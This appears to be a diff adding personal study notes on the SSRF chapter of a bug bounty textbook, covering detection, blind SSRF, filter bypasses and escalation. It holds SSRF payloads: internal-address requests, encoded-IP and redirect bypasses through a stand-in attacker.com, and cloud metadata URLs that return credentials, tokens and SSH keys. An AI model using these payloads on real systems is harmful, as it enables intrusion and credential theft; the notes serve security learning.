@@ -2460,4 +2460,232 @@ _Step 1: Spot Features Prone to SSRFs_
 
 _Step 2: Provide Potentially Vulnerable Endpoints with Internal URLs_
 
+- Test the endpoints you've found with suspected internal addresses
+
+  - Using local host or IPv4 addresses you suspect to be in use is usually a good starting point.
+  - The book is light here, and suggest looking at Reserved_IP_addresses on [wikipedia](https://en.wikipedia.org/wiki/Reserved_IP_addresses)
+  - The book uses Class C networks (255.255.255.0 default subnet mask), but these tend to be used in small home networks.
+    - You're more likely to encounter Class A or Class B reserved classes with companies that are large enough to host bug bounty progams.
+      |Name|First Octet|Number of subnets|Number of hosts|Range|Default subnet mask|Description|
+      |Class A|1 to 126|126|Approx. 16.7 million|10.0.0.0|255.0.0.0|Larger networks with many hosts|
+      |Class B|128 to 191|16,384|65,536|172.16.0.0|255.255.0.0|Medium networks with a moderate number of hosts|
+      |Class C|192 to 233|Approximately 2.1 million|254|192.168.0.0|255.255.255.0|Smaller networks with fewer hosts|
+  - ex. Webhook to (hopefully) local IPv4 address 192.168.0.1:
+
+    ```
+    POST /webhook
+    Host: public.example
+
+    (POST request body)
+    url=https://192.168.0.1
+    ```
+
+  - ex. File upload functionality:
+
+    ```
+    POST /upload_profile_from_url
+    Host: example.com
+
+    (POST request body)
+    user_id=1234&url=https://192.168.0.1
+    ```
+
+  - ex. test proxy service:
+
+  ```
+  https://example.com/proxy?url=https://192.168.0.1
+  ```
+
+_Step 3: Check the Results_
+
+- See if the server returns a response that reveals information about the internal service.
+
+  - Does it contain service banners or content from internal pages?
+  - _Service Banners_ will return te name and version of software running on the machine
+  - You can include a port number with the internal IP address to test for specific services:
+
+    ```
+    POST /upload_profile_from_url
+    Host: public.example.com
+
+    (POST request body)
+    user_id=1234&url=127.0.0.1:22
+    ```
+
+  - Look for a response like this: `Error: cannot upload image: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4`
+  - If you get a response that returns service information like this, you have an SSRF.
+
+- For blind SSRF, you will need to use an out-of-band Techniques
+  - You will need a public server that you control and that you get the target to send requests to.
+  - You then monitor the server logs for the requests you've tried to get the target to send.
+  - You will need to spend money on a domain, dynamic DNS provider, or BurpSuitePro.
+    - The book mentions using Netcat instead, but that's like saying all you need is a bike tire to enter a bicycle race.
+      - You could use netcat as a listener to view incoming requests as opposed to reviewing your server logs, but that's about it (to my knowledge).
+      - Most people who use VPN connected hacking labs (like hachthebox.com - which is awesome!) misunderstand this because they _can_ use something like netcat to achieve the hack, but that's only because you're connected through a VPN and the target and your attack machine are on the same network. This won't work when you're trying to get an external server (target) to connect to your local attack machine without a dynamic DNS setup.
+    - If you can afford the $400+ a year for BurpSuitePro, the Pro version has the Collaborator feature that gives you access to their public server for testing out-of-band attacks.
+      - Buying your own domain will most likely be cheaper, but requires a lot more setup. If you have a website you use for your business, you could use this website for testing if you have enough control over it set things up.
+  - Just getting a request from the target isn't proof of a successful blind SSRF, you will need to use the Blind SSRF attack to explore their internal network (read internal files, access internal services, etc.)
+    - Make requests to different service ports (22, 80, 443, etc.). If you can get a 200 HTTP status code, it would indicate that you're able to connect to that HTTP service.
+      - Check out HTTP status codes [here](https://www.semrush.com/blog/http-status-codes/?kw=&cmp=CA_SRCH_DSA_Blog_EN&label=dsa_pagefeed&Network=g&Device=c&utm_content=676606881983&kwid=dsa-2185834088336&cmpid=18361978716&agpid=155254834078&BU=Core&extid=105177813075&adpos=&gad_source=1&gclid=Cj0KCQjwhb60BhClARIsABGGtw8umQK3T9aTqEh51qTn8u33jbR21hKznczdGAcmMc7iMulRLn26N0saAt1REALw_wcB)
+      - The book doesn't really go into detail about how to successfully prove an SSRF attack. Offensive Security, Hachthebox, and PortSwigger would be better resources for learning these techniques. I've had issues with Offensive Security that left a bad taste in my mouth, but HackTheBox and PortSwigger really get it right with their users/customers.
+- You can use tools like [SSRFmap](https://github.com/swisskyrepo/SSRFmap/) to help in this process.
+
+_Bypassing SSRF Protection_
+
+- If you get a response like, "`Error. Resquests to this address are not allowed. Please try again.`" You've found something, but you'll have to bypass the protections (probably an allowlist or blocklist).
+
+_Bypass Allowlists_
+
+- These are generally the hardest to bypass because they are more strict by design than blocklists.
+
+  - If you have found an open redirect as well, you can request an allowlisted URL that redirects to an internal URL.
+
+    - ex. You have an open redirect on pics.example.com and redirect the request to 127.0.0.1 (loop back address):
+
+    ```
+    POST /upload_profile_from_url
+    Host: public.example.com
+
+    (POST request body)
+    user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1
+    ```
+
+  - Regexes are often used to construct more flexible allow lists.
+    - Instead of checking whether a URL string is equal to "example.com", the site could use a regex expression like `.*example.com.*` to include the subdomains and filepaths of example.com as well.
+    - You could then bypass the allow list by including example.com in your URL.
+      - The open redirect already does this, otherwise you could create a subdomain of example.com.attacker.com to bypass.
+      - ex. `user_id=1234&url=https://pics.example.com@127.0.0.1`: here, pics.example.com would be interpreted as the username.
+      - `user_id=1234&url=https://127.0.0.1/pics.example.com`: here, pics.example.com would be seen as the directory portion of the url.
+
+_Bypass Blocklists_
+
+- Easier to bypass.
+
+_Fooling It with Redirects_
+
+- Make the server request to a URL you control and that redirects to the blockedlisted address.
+  - ex. Initial request to, `https://public.example.com/proxy?url=https://attacker.com/ssrf`, then on your server (attacker.com/ssrf) host a file containing `<?php header("location: https://127.0.0.1"); ?>`.
+    - This attack should bypass the blocklist because the URL submitted to the app does not itself contain any blocklisted addresses.
+
+_Using IPv6 Addresses_
+
+- Sometimes the SSRF protections a site has implemented for IPv4 are not set up for IPv6.
+  - `::1` points to the localhost and `cf00::` is the first address on the private network.
+    - I haven't used this, but I suspect it requires a bit of a different syntax than using domain names or IPv4 addresses to get it to work.
+    - I _do_ know that to use an IPv6 address you would need to enclose the address in "[]"; you cannot write a port numbers inside the IPv6 address, the port number needs to be outside of the "[]"; Browsers automatically convert IPv6 into corresponding IPv4 representations before sending the request to the server, so you would probably need a tool or plugin that supports IPv6.
+      - ex. IPv6 address: `user_id=1234&url=https://[<IPv6 address here>]:<port number>/path`
+      - None of this is mentioned in the book and the book doesn't describe how to use an IPv6 address to bypass the blocklist.
+  - [IPv6 wiki](https://en.wikipedia.org/wiki/IPv6_address)
+
+_Tricking the Server with DNS_
+
+- DNS records are used by computers to translate hostnames into IP addresses.
+  - Most common DNS records are A and AAAA records.
+    - A records point a hostname to an IPv4 address
+    - AAAA records translate hostnames to IPv6 addresses.
+- Modify the A/AAAA record of a domain you control and make it point to the internal addresses on the victim's network.
+  - Checking A and AAAA records of your domain:
+    - `nslookup DOMAIN`: for A records.
+    - `nslookup DOMAIN -type=AAAA`: For AAAA records.
+  - Use the domain registrar or web-hosting service's setting page to configure your DNS records.
+    - ex. Namecheap: configure DNS records by going `Domain List` > `Manage Domain` > `Advanced DNS` > `Add New Record`.
+  - Create a custom mapping of hostname to IP address and make your domain resolve to 127.0.0.1 - create an A record for your domain that points to 127.0.0.1.
+    - You then get the target domain to send a request to your server, `https://public.example.com/proxy?url=https://attacker.com`.
+    - When the target requests your domain, it will be pointed to 127.0.0.1 and request data from that address (itself).
+
+_Switching Out the Encoding_
+
+- Encoding methods don't change how a server interprets the location of the address, but they might allow the input to slip under the radar of a blocklist if it bans only address that are encoded in a certain way.
+- Possible encoding methods: hex encoding, octal encoding, dword encoding, URl encoding, and mixed encoding.
+  - If the URL parser of the target server does not process these encoding methods appropriately, you might be able to bypass SSRF protections.
+- IP addresses use decimal encoding which is base-10 format that uses characters 0-9 (10.0.0.1).
+- To translate decimal encoding to hex, use a decimal-to-hex calculator which would turn 127.0.0.1 into 0x7f.0x0.0x0.0x1 in hex.
+  - `https://public.example.com/proxy?url=https://0x7f.0x0.0x0.0x1`
+- Decimal to octal (base-8 format) looks like this: `https://public.example.com/proxy?url=https://0177.0.0.1`
+- Dword or double word encodes an IP address into a single 32-bit integer (called a dword).
+  - You need to split the address into four octets (essentially split on the . of the IP address).
+  - Write out the binary representation of each octet: 127.0.0.1 = 01111111.00000000.00000000.00000001 (remember they're 8 bits, so 8 numbers per octet). The book doesn't explain why you do this, it just goes into the math below that is barely related.
+  - Do a bunch of math (or use a converter), 127 x 256^3 + 0 x 256^2 + 0 x 256^1 + 1 x 256^0, which = 2130706433. So `https://2130706433` would be interpreted the same as `https://127.0.0.1`.
+    - The author was just trying to increase word count here?
+- Mix and match encoding to see what happens: http://0177.0.0.0x1 would be the following mix: http://octal.decimal.decimal.hex
+- Always think to yourself, "How would I implement a protection mechanism for this feature."
+  - I would add: Think about what would be the easiest way, then think about what would be the hardest way. The dev's will likely be somewhere in-between with their implementation.
+    - Looking up best practices for the protections you're trying to bypass can also be helpful. Start with the best practice and craft a payload that will test that the best practice has been implemented correctly. If it hasn't, your payload may succeed.
+
+**Escalating the Attack**
+
+- Use SSRF to scan the network for reachable hosts, port-scan internal machines to fingerprint internal services, collect instance metadata, bypass access controls, leak confidential data, and even execute code on reachable machines.
+
+_Perform Network Scanning_
+
+- To scan using an SSRF, you would need to iterate through all the possible IP addresses and port numbers you're interested in. This is probably best done through scripting to automate the process. If you want help with scripting tasks for hacking, you should definitely check out my [AI github](https://github.com/Xerips/AI/blob/main/Ollama/setup.md) to setup your own locally hosted AI.
+
+**_Pull Instance Metadata_**
+
+- Cloud computing services allow businesses to run their applications on other people's servers. Services like Amazon's Elastic Compute Cloud (EC2) offers an instance metadata tool that enables EC2 instances to access data about themselves by querying the API endpoint at 169.254.169.254.
+  - _Instances_ are virtual servers used for running applications on a cloud provider's infrastructure (Google Cloud offers similar services).
+  - These APi endpoints are accessible by default unless network admins specifically block or disable them. The information these services reveal is often extremely sensitive and could allow attackers to escalate SSRFs to serious information leaks and even RCE.
+
+_Querying EC2 Metadata_
+
+- If the target hosts its infrastructure on Amazon EC2, try querying various instance metadat about the host using this endpoint.
+  - ex. `https://169.254.169.254/latest/meta-data/`
+  - ex. With a SSRF vulnerable endpoint: `https://public.example.com/proxy?url=http://169.254.196.254/latest/meta-data`
+  - These endpoints reveal information like API keys, Amazon S3 tokens, and passwords.
+  - Useful API endpoints:
+    - `http://169.254.169.254/latest/meta-data`: returns the list of available metadata that you can query.
+    - `http://169.254.169.254/latest/meta-data/local-hostname/`: returns the internal hostname used by the host.
+    - `http://169.254.169.254/latest/meta-data/security-credentials/ROLE_NAME`: returns the security credentials of that role.
+    - `http://169.254.169.254/latest/dynamic/instance-identity/document/`: returns the private IP address of the current instance.
+    - `http://169.254.169.254/latest/user-data/`: returns user data on the current instance.
+  - API endpoint documentation for EC2: [https://docs.aws.amazon.com/AWSEC2/latest/Userguide/ec2-instance-metadata.html](https://docs.aws.amazon.com/AWSEC2/latest/Userguide/ec2-instance-metadata.html)
+
+_Querying Google Cloud Metadata_
+
+- Google implements additional security measures for its API endpoints, so querying Google Cloud Metadata APIv1 requires one of these special headers:
+  ```
+  Metadata-Flavor: Google
+  X-Google-Metadata-Request: True
+  ```
+  - To bypass this, you cannot specify special headers for the forged request, but you could access the API via v1beta1 endpoints - and earlier version of the metadata API (confirmed shut down).
+- Endpoints to target:
+  - `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/tokens`: returns the access token of the default account on the instance.
+  - `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys `: returns SSH keys that can connect to other instances in this project.
+- API documentation [https://cloud.google.com/compute/docs/storing-retrieving-metadata/](https://cloud.google.com/compute/docs/storing-retrieving-metadata/).
+  - v1beta1 is shut down, so to use this you will need to find a way to forge the headers.
+
+_Network and Port Scanning Using HTTP Status Codes_
+
+- HTTP status codes provide information about whether the request succeeded. By comparing responses codes returned for requests to different endpoints, we can infer which of them are valid.
+  - ex. A request to `https://public.example.com/webhook?url=10.0.0.1` results in an HTTP Status code of 200, and a request to `https://public.example.com/webhook?url=10.0.0.2` results in an HTTP Status code of 500.
+    - Based on these responses we can deduce that 10.0.0.1 is the address of a valid host, and 10.0.0.2 is not.
+  - Port scanning works the same way.
+  - If all requests return the same status code, the site might have implemented protection against SSRF.
+
+_Network and Port Scanning using Server Response Times_
+
+- You may be able to determine a network structure based on the time it takes for a server to respond.
+- If it takes much longer to respond for some addresses, those network addresses might be unrouted or hidden behind a firewall.
+  - _Unrouted addresses_ cannot be reached from the current machine.
+  - Short response times may indicated an unrouted address because the router might have dropped the request immediately.
+  - Longer response times may indicate a port or address is active, but is being blocked by the firewall.
+- The key is to look for differences in behavior (patterns) that may indicate if a port or address is being used.
+- The target machine might also leak sensitive information in outbound requests, such as internal IPs, headers, and version numbers of the software being used.
+- If you can't access an internal address, you can always try to provide the vulnerable endpoint with the address of a server you own and see what you can extract from the incoming request.
+
+**Finding Your First SSRF**
+
+1. Spot the features prone to SSRFs and take notes for future reference.
+2. Set up a callback listener to detect blind SSRFs by using an online service or Burp's Collaborator feature.
+3. Provide the potentially vulnerable endpoints with common internal addresses or the address of your callback listener.
+4. Check if the server responds with information that confirms the SSRF. Or, in the case of a blind SSRF, check your server logs for requests from the target server.
+5. In the case of a blind SSRF, check if the server behavior differs when you request different hosts or ports.
+6. If SSRF protection is implemented, try to bypass it by using the strategies discussed in this chapter.
+7. Pick a tactic to escalate the SSRF.
+8. Draft your first SSRF report!
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 14: Insecure Deserialization
+
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
